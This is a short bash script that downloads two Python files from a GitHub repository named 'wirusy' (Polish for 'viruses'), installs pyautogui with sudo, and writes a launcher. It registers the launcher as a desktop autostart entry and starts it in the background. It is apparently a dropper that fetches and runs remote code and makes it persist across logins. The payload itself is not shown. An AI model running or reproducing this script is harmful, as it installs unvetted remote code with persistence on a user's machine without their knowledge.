rm s.py
rm addautostart.py
wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/s.py'
wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/addautostart.py'
user=$(whoami)
sudo pip3 install pyautogui
rm s.sh
echo "python3 /home/$user/s.py" > s.sh
chmod +x s.sh
eval $"rm '/home/$user/.config/autostart/?.desktop'"
python3 /home/$user/addautostart.py '?' './home/$user/s.sh'
eval $"chmod +x '/home/$user/.config/autostart/?.desktop'"
bash s.sh &
